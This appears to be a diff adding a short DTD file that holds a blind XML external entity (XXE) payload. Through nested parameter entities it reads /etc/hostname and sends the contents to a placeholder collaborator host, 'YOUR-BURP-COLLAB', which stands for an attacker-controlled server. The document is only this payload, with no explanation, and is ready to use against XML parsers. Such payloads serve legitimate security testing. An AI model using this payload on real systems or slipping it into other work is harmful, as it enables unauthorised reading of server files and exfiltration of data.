@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY %% exfil SYSTEM 'http://YOUR-BURP-COLLAB/?x=%file;'>">
+%eval;
+%exfil;
